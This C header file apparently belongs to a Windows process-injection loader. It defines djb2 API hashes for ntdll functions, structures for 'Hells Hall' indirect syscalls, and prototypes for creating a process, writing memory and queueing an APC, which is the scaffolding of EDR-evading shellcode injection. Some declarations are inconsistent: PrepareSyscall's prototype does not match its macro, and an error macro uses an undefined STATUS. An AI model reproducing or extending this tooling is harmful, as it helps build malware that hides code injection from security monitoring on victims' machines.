#pragma once
#include <windows.h>
#include <stdio.h>
#include "structs.h"

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// Debug messages
#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) wprintf(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) wprintf(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) fwprintf(stderr, L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",   \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n", \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

// Function hashes
#define NTDLL_HASH 0x4AB3B7F2DFAF7C0B
#define RtlCreateProcessParametersEx_HASH 0x714B4F4E3C84A219
#define NtCreateUserProcess_HASH 0xEC8B829B7F36C8F7
#define NtAllocateVirtualMemory_HASH 0xB93E3F9D68F0E5EA
#define NtWriteVirtualMemory_HASH 0x90409184AAAC9EF0
#define NtProtectVirtualMemory_HASH 0x079775FC2EFDA9A6
#define NtQueueApcThread_HASH 0x916100A4C7391A96
#define NtResumeThread_HASH 0x818FCBEA4D9D860E
#define NtClose_HASH 0xCA002A35D3E5B9DB

// Structs for Hells Hall (indirect syscall) implementation
typedef struct _NTDLL_CONFIG {
    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions   
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions       
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions     
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll                 
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs  

} NTDLL_CONFIG, * PNTDLL_CONFIG;

typedef struct _NT_SYSCALL {
    DWORD dwSSN;                    // syscall number
    DWORD dwSyscallHash;            // syscall hash value
    PVOID pSyscallAddress;          // syscall address
    PVOID pSyscallInstAddress;      // address of a random 'syscall' instruction in ntdll    
} NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTAPI_FUNC {
    NT_SYSCALL NtCreateUserProcess;
    NT_SYSCALL NtAllocateVirtualMemory;
    NT_SYSCALL NtProtectVirtualMemory;
    NT_SYSCALL NtWriteVirtualMemory;
    NT_SYSCALL NtQueueApcThread;
    NT_SYSCALL NtResumeThread;
    NT_SYSCALL NtClose;
} NTAPI_FUNC, * PNTAPI_FUNC;

// Function prototypes for indirect syscalls
extern VOID PrepareSyscall(WORD wSystemCall);
extern RunSyscall();

#define SET_SYSCALL(NtSys)(PrepareSyscall((DWORD)NtSys.dwSSN,(PVOID)NtSys.pSyscallInstAddress))

DWORD64 djb2(PBYTE str);
VOID PrintHashes();
BOOL InitializeIndirectSyscalls(PNTAPI_FUNC Nt);
VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer);
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD64 dwApiNameHash);
HMODULE GetModuleHandleH(IN DWORD64 dwModuleNameHash);

// Structs for NtCreateUserProcess
typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1]; // Number of attributes
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* fnRtlCreateProcessParametersEx) (
    _Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    _In_ PUNICODE_STRING ImagePathName,
    _In_opt_ PUNICODE_STRING DllPath,
    _In_opt_ PUNICODE_STRING CurrentDirectory,
    _In_opt_ PUNICODE_STRING CommandLine,
    _In_opt_ PVOID Environment,
    _In_opt_ PUNICODE_STRING WindowTitle,
    _In_opt_ PUNICODE_STRING DesktopInfo,
    _In_opt_ PUNICODE_STRING ShellInfo,
    _In_opt_ PUNICODE_STRING RuntimeData,
    _In_ ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
    );